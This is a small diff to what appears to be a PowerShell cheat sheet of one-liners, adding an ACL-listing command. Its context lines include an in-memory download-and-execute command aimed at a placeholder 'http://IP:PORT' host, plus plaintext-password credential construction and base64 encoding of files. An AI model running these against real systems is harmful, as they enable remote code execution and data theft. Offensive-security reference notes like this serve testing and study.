@@ -3,6 +3,7 @@ $cred = Import-CliXml -Path PATH
 $cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $pass)
 $pass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
 [Convert]::ToBase64String([System.IO.File]::ReadAllBytes('PATH'))
+Get-ACL PATH | fl *
 Get-ChildItem -Path PATH -Filte FILE -Recurse
 Get-Command COMMAND
 IEX(IWR 'http://IP:PORT/FILE' -UseBasicParsing)
